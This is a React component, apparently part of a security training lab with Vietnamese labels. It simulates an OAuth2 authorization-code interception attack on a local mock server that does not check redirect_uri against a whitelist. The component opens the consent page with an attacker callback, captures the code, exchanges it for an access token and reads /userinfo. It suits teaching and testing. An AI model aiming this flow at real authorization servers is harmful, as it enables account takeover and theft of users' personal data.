import { useState, useEffect } from 'react'

export default function OAuth2AttackPage() {
  const [oauthUrl, setOauthUrl] = useState('http://localhost:4003')
  const [clientId, setClientId] = useState('react-client-app')
  const [redirectUri, setRedirectUri] = useState('http://localhost:3001/callback')
  const [state, setState] = useState(() => Math.random().toString(36).substring(2, 10))
  const [scope, setScope] = useState('openid profile email')

  const [interceptedCode, setInterceptedCode] = useState('')
  const [interceptedState, setInterceptedState] = useState('')
  const [tokenResponse, setTokenResponse] = useState(null)
  const [userInfoResponse, setUserInfoResponse] = useState(null)

  const [loadingToken, setLoadingToken] = useState(false)
  const [loadingUserInfo, setLoadingUserInfo] = useState(false)
  const [logs, setLogs] = useState([])

  const addLog = (msg, type = 'info') => {
    const t = new Date().toLocaleTimeString()
    setLogs(l => [...l, { msg, type, t, id: Math.random() }])
  }

  // Monitor window messages from the popup callback page
  useEffect(() => {
    const handleMessage = (event) => {
      if (event.data && event.data.type === 'OAUTH_CODE_INTERCEPTED') {
        const { code, state: returnedState } = event.data
        setInterceptedCode(code)
        setInterceptedState(returnedState)
        addLog(`Intercepted code successfully from callback popup window!`, 'success')
        addLog(`Captured Code: ${code}`, 'warning')
        addLog(`State Parameter: ${returnedState}`, 'info')
      }
    }
    window.addEventListener('message', handleMessage)
    return () => window.removeEventListener('message', handleMessage)
  }, [])

  const startAuthorization = () => {
    const stateStr = state || Math.random().toString(36).substring(2, 10)
    if (!state) setState(stateStr)

    const authorizeUrl = `${oauthUrl}/authorize?client_id=${encodeURIComponent(clientId)}&redirect_uri=${encodeURIComponent(redirectUri)}&scope=${encodeURIComponent(scope)}&state=${encodeURIComponent(stateStr)}`
    
    addLog(`[STEP 1] Starting Authorization Flow...`, 'info')
    addLog(`Initiating request to: ${authorizeUrl}`, 'info')
    addLog(`Redirect URI parameter set to hacker callback: ${redirectUri}`, 'warning')

    // Open consent page in a new window/popup
    window.open(authorizeUrl, 'oauth2_consent', 'width=500,height=600,left=100,top=100')
  }

  const exchangeCodeForToken = async () => {
    if (!interceptedCode) {
      addLog(`Cần chặn được auth code trước (Bước 1 & 2)`, 'error')
      return
    }
    setLoadingToken(true)
    setTokenResponse(null)
    addLog(`[STEP 3] Exchange auth code for access token...`, 'info')
    addLog(`POST ${oauthUrl}/token with code: ${interceptedCode}`, 'info')

    try {
      // Dùng URLSearchParams để gửi dạng application/x-www-form-urlencoded
      const params = new URLSearchParams()
      params.append('code', interceptedCode)
      params.append('client_id', clientId)
      params.append('grant_type', 'authorization_code')
      params.append('redirect_uri', redirectUri)

      const res = await fetch(`${oauthUrl}/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params
      })
      
      const data = await res.json()
      setTokenResponse({ status: res.status, data })

      if (res.ok) {
        addLog(`Token exchange successful! Received access token.`, 'success')
        addLog(`Access Token: ${data.access_token}`, 'warning')
      } else {
        addLog(`Token exchange failed: ${data.error || 'Unknown error'}`, 'error')
      }
    } catch (e) {
      addLog(`Network error: ${e.message}`, 'error')
    } finally {
      setLoadingToken(false)
    }
  }

  const getUserInfo = async () => {
    const token = tokenResponse?.data?.access_token
    if (!token) {
      addLog(`Cần có access token trước (Bước 3)`, 'error')
      return
    }
    setLoadingUserInfo(true)
    setUserInfoResponse(null)
    addLog(`[STEP 4] Accessing Resource /userinfo...`, 'info')
    addLog(`GET ${oauthUrl}/userinfo with Bearer token`, 'info')

    try {
      const res = await fetch(`${oauthUrl}/userinfo`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      })
      
      const data = await res.json()
      setUserInfoResponse({ status: res.status, data })

      if (res.ok) {
        addLog(`SUCCESS! Stole user identity and personal profile data!`, 'error')
        addLog(`Decrypted User: ${data.name || data.sub} (${data.email || 'no email'})`, 'error')
      } else {
        addLog(`Accessing userinfo failed: ${res.status}`, 'error')
      }
    } catch (e) {
      addLog(`Network error: ${e.message}`, 'error')
    } finally {
      setLoadingUserInfo(false)
    }
  }

  return (
    <div>
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 22, fontWeight: 800, color: '#f59e0b' }}>
          OAuth2 Authorization Code Interception
        </h1>
        <p style={{ color: '#94a3b8', fontSize: 13, marginTop: 4 }}>
          Mô phỏng tấn công chiếm đoạt Authorization Code do thiếu kiểm duyệt whitelist của redirect_uri
        </p>
      </div>

      <div className="grid-2">
        <div>
          {/* Cấu hình & Kích hoạt */}
          <div className="card">
            <div className="step-header">
              <div className="step-num">1</div>
              <div className="step-title">Khởi tạo Authorization Request</div>
            </div>

            <div className="form-group" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
              <div>
                <label className="form-label">OAuth2 Server URL</label>
                <input className="form-input" value={oauthUrl} onChange={e => setOauthUrl(e.target.value)} />
              </div>
              <div>
                <label className="form-label">Client ID</label>
                <input className="form-input" value={clientId} onChange={e => setClientId(e.target.value)} />
              </div>
            </div>

            <div className="form-group">
              <label className="form-label">Redirect URI (Hacker URL)</label>
              <input className="form-input" value={redirectUri} onChange={e => setRedirectUri(e.target.value)} />
              <small style={{ color: '#ef4444', fontSize: '11px', marginTop: '4px', display: 'block' }}>
                Đây là URL Callback của Hacker Tool. Vì OAuth server không kiểm tra whitelist, nó chấp nhận gửi code về đây.
              </small>
            </div>

            <div className="form-group" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
              <div>
                <label className="form-label">Scope</label>
                <input className="form-input" value={scope} onChange={e => setScope(e.target.value)} />
              </div>
              <div>
                <label className="form-label">State (CSRF protection)</label>
                <input className="form-input" value={state} onChange={e => setState(e.target.value)} />
              </div>
            </div>

            <button className="btn btn-warning" onClick={startAuthorization} style={{ width: '100%' }}>
              Bắt đầu Authorization (Mở Consent Page)
            </button>
          </div>

          {/* Chặn Auth Code */}
          <div className="card">
            <div className="step-header">
              <div className={`step-num ${interceptedCode ? 'done' : ''}`}>2</div>
              <div className="step-title">Chặn (Intercept) Authorization Code</div>
              {interceptedCode && <span className="badge badge-warning">Captured</span>}
            </div>

            <div className="form-group">
              <label className="form-label">Captured Auth Code</label>
              <input 
                className="form-input" 
                style={{ fontFamily: 'monospace', color: '#22c55e', fontWeight: 'bold' }}
                placeholder="Đang chờ auth code..."
                value={interceptedCode}
                onChange={e => setInterceptedCode(e.target.value)} 
              />
            </div>
            
            <div className="form-group">
              <label className="form-label">Returned State Parameter</label>
              <input 
                className="form-input" 
                style={{ fontFamily: 'monospace', color: '#cbd5e1' }}
                placeholder="State parameter..."
                value={interceptedState}
                onChange={e => setInterceptedState(e.target.value)} 
              />
            </div>
          </div>

          {/* Đổi token */}
          <div className="card">
            <div className="step-header">
              <div className={`step-num ${tokenResponse?.status === 200 ? 'done' : ''}`}>3</div>
              <div className="step-title">Exchange Auth Code for Access Token</div>
            </div>
            <p style={{ fontSize: '12px', color: '#94a3b8', marginBottom: '12px' }}>
              Attacker gửi yêu cầu POST đến endpoint <code style={{ color: '#f59e0b' }}>/token</code> kèm client_id, code và redirect_uri để đổi lấy Access Token.
            </p>
            <button 
              className="btn btn-warning" 
              onClick={exchangeCodeForToken} 
              disabled={loadingToken || !interceptedCode}
            >
              {loadingToken ? <div className="spinner" /> : 'Exchange for Access Token'}
            </button>

            {tokenResponse && (
              <div className={`result-panel ${tokenResponse.status === 200 ? 'warning' : 'error'}`} style={{ marginTop: 12 }}>
                <div style={{ fontWeight: 700, marginBottom: 8, fontSize: 13 }}>
                  {tokenResponse.status === 200
                    ? 'ACCESS TOKEN ACQUIRED!'
                    : `EXCHANGE FAILED (${tokenResponse.status})`}
                </div>
                <div className="code-box" style={{ maxHeight: 120, fontSize: 11 }}>
                  {JSON.stringify(tokenResponse.data, null, 2)}
                </div>
              </div>
            )}
          </div>

          {/* User Info */}
          <div className="card">
            <div className="step-header">
              <div className={`step-num ${userInfoResponse?.status === 200 ? 'done' : ''}`}>4</div>
              <div className="step-title">Khai thác Resource (UserInfo)</div>
            </div>
            <p style={{ fontSize: '12px', color: '#94a3b8', marginBottom: '12px' }}>
              Dùng Access Token vừa chiếm đoạt được để truy cập thông tin tài khoản người dùng tại endpoint <code style={{ color: '#f59e0b' }}>/userinfo</code>.
            </p>
            <button 
              className="btn btn-danger" 
              onClick={getUserInfo} 
              disabled={loadingUserInfo || !tokenResponse?.data?.access_token}
            >
              {loadingUserInfo ? <div className="spinner" /> : 'Get User Info'}
            </button>

            {userInfoResponse && (
              <div className={`result-panel ${userInfoResponse.status === 200 ? 'error' : 'success'}`} style={{ marginTop: 12 }}>
                <div style={{ fontWeight: 700, marginBottom: 8, fontSize: 13 }}>
                  {userInfoResponse.status === 200
                    ? 'USER IDENTITY COMPROMISED!'
                    : `RESOURCE ERROR (${userInfoResponse.status})`}
                </div>
                <div className="code-box" style={{ maxHeight: 150, fontSize: 11 }}>
                  {JSON.stringify(userInfoResponse.data, null, 2)}
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Log & Giải thích */}
        <div>
          <div className="card" style={{ height: 'fit-content', position: 'sticky', top: 24 }}>
            <div className="card-title">
              Attack Log
              <button className="btn btn-ghost" style={{ marginLeft: 'auto', padding: '4px 10px', fontSize: 11 }}
                onClick={() => setLogs([])}>Clear</button>
            </div>
            <div className="attack-log" style={{ height: '220px' }}>
              {logs.length === 0 ? (
                <div style={{ color: '#475569', fontStyle: 'italic', padding: '8px' }}>Chưa có log tấn công...</div>
              ) : (
                logs.map(l => (
                  <div key={l.id} className={`log-entry ${l.type}`}>
                    <span style={{ color: '#475569' }}>[{l.t}]</span> {l.msg}
                  </div>
                ))
              )}
            </div>
            
            <div style={{ marginTop: 14, padding: 12, background: '#060e1a', borderRadius: 7, fontSize: 12 }}>
              <div style={{ fontWeight: 700, color: '#f59e0b', marginBottom: 8 }}>Lỗi OAuth2 Redirect URI Interception</div>
              <div style={{ color: '#94a3b8', lineHeight: 1.6 }}>
                Lỗ hổng xảy ra khi OAuth2 Authorization Server **không đối chiếu chính xác** tham số <code style={{ color: '#ef4444' }}>redirect_uri</code> của yêu cầu với danh sách các callback được phép (whitelist) đã đăng ký trước bởi Client.
                <br/><br/>
                Kẻ tấn công có thể lừa nạn nhân click vào link authorization với redirect_uri dẫn tới máy chủ của kẻ tấn công (ở đây mô phỏng là <code style={{ color: '#cbd5e1' }}>http://localhost:3001/callback</code>). 
                Khi nạn nhân xác nhận cấp quyền (Allow), OAuth server chuyển hướng token/code trực tiếp về hacker.
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
